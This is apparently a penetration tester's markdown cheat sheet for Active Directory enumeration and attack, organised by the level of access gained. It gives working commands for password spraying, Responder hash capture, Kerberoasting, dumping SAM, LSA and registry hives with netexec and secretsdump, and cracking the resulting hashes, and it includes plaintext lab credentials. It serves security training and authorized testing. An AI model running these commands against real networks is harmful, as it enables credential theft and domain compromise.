# Active Directory - Enumeration

## Keep in mind

   https://github.com/Andre92Marcos/escalations/blob/master/active_directory_attacks_enumeration.md
   https://github.com/Andre92Marcos/escalations/blob/master/ldap_security_enumeration.md

## Check for attacks

petit-potam: https://github.com/AndreMIsidoro/escalations/blob/master/ad_attacks_enum/petitPotam.md


## For connections

winrm: evil-winrm
with smb: impacket-psexec
with wmi: impacket-wmiexec

## When we dont have anything

### Do simple enum of services (RPC,SMB)

Use enum4linux-ng

   https://github.com/Andre92Marcos/tools/tree/master/enum4linux-ng


### Try to do an ldap anonymous bind

   ldapsearch -x -b "dc=example,dc=com"


### Use ldapdomaindump

https://github.com/Andre92Marcos/tools/tree/master/ldapDomainDump

### Use netexec

https://github.com/Andre92Marcos/tools/blob/master/netexec/README.md#ldap

## When we get a new password do a kerbrute passwordspray

https://github.com/AndreMIsidoro/tools/tree/master/kerbrute

## When we have access to target's network

Start responder to try to do some poisoning

   https://github.com/Andre92Marcos/tools/tree/master/responder

## If we have usernames and want to check if they are domain usernames

Enumerate users found to see if they pre authenticate to kerberos

   kerbrute userenum --dc <ip_to_domain_controller> -d <full_domain_name> <filename_with_usernames>


## When we have a domain username, no password, no shell

If we can make the target make a smb request back to us

   For example using sqlinjection, we can use responder to get hash and try to crack it
   https://github.com/Andre92Marcos/tools/tree/master/responder


Try to do some ASREProasting

   https://github.com/Andre92Marcos/escalations/blob/master/ad_attacks_enum/ASREProasting.md

If we are successful we can also try to do some Kerberoasting no preauthentication

   https://github.com/Andre92Marcos/escalations/blob/master/ad_attacks_enum/kerberoasting.md#kerberoast-no-pre-authentication

Use bloodhound

   https://github.com/Andre92Marcos/tools/tree/master/bloodhound

## When we have a domain username and a password

We can request a TGT

   https://github.com/AndreMIsidoro/tools/blob/master/impacket/getTGT.md

Try to do some Kerberoasting

   https://github.com/Andre92Marcos/escalations/blob/master/ad_attacks_enum/kerberoasting.md

Use netexec smb and ldap

https://github.com/Andre92Marcos/tools/blob/master/netexec/README.md

Use impacket to search for more users

```shell
impacket-GetADUsers -all <domain>/<controlled_user> -dc-ip 10.129.40.252
```

Try to look for Group Policy Preferences (GPP) store plaintext or AES-encrypted credentials for AutoLogon in Active Directory environments:

```shell
netexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86! -M gpp_autologin
```


## When we have a domain username, but no password, but we have a shell

Do a gci request to get the user hash (and use it in other protocols, and try to crack it), with responder running

   gci \\<mylocalhostip>\share\file #share and file dont have to exist

Use group3r

   https://github.com/Andre92Marcos/tools/tree/master/group3r

Use ADRecon

   https://github.com/AndreMIsidoro/tools/tree/master/adrecon

Use the snaffler tool

   https://github.com/Andre92Marcos/tools/tree/master/snaffler

Use laZagne tool

   https://github.com/AndreMIsidoro/tools/tree/master/laZagne

Use bloodhound

   https://github.com/Andre92Marcos/tools/tree/master/bloodhound

Try some simple password spraying:

https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1
```shell
#PowerView
Invoke-DomainPasswordSpray -Password Welcome1
```

If we are not finding anythin with bloodhound

   Load powesploit PowerView.ps1 from:

      https://github.com/PowerShellMafia/PowerSploit/tree/dev

   And then run 

      Find-InterestingDomainAcl -ResolveGUIDS | ConvertTo-Json

   This might find relations that bloodhound missed

## When we have a TGT and there is certificate authentication in the domain

User certipy to find vulnerabilities (for example, after a shadow credentials attack)

https://github.com/Andre92Marcos/escalations/blob/master/ad_attacks_enum/shadow_credentials.md
https://github.com/Andre92Marcos/tools/blob/master/certipy-ad/README.md#find



## When have a local Admin or domain Admin

Use mimikatz tool. (Also if we have user with SeDebugPrivilege)

   https://github.com/Andre92Marcos/tools/tree/master/mimikatz

Dump sam database for hashes

```shell
netexec smb 10.129.202.137 --local-auth -u bob -p 'HTB_@cademy_stdnt!' --sam
# add the nt hash (last hash) to a file and crack it
hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

Dump lsa secrets

```shell
netexec smb 10.129.202.137 --local-auth -u bob -p 'HTB_@cademy_stdnt!' --lsa
```

Dump lsass secrets with mimikatz


Dump SAM database as with a System user:

```
reg save HKLM\SYSTEM SYSTEM.SAVE
reg save HKLM\SECURITY SECURITY.SAVE
reg save HKLM\SAM SAM.SAVE
```
Then upload the files to your host and use secretdumps on the files:

```shell
impacket-secretsdump LOCAL -system SYSTEM.SAVE -sam SAM.SAVE -security SECURITY.SAVE
```

It's also worth running Inveigh once we have local admin on a host to see if we can obtain password hashes for any users.


## Other Tips

### Sync time with kerberos

To figure out the difference in time with the kerberos server:

   sudo ntpdate 10.129.127.130

To simulate the difference in time when executing a command:

   faketime -f '+7h' <command>


## More Information

https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet